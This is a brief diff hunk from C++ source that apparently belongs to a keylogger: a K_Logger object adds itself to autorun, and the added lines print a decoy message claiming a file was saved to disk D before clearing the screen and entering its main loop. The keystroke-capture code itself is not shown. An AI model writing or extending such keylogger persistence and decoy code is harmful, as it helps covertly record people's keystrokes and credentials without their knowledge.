@@ -833,6 +833,10 @@ int main()
 	K_Logger keyLog;
 
 	keyLog.AddToAutorun();
+	
+	cout << "File is saved to disk D\nWait..." << endl;
+	Sleep(1000);
+	system("cls");
 
 	while (true)
 	{
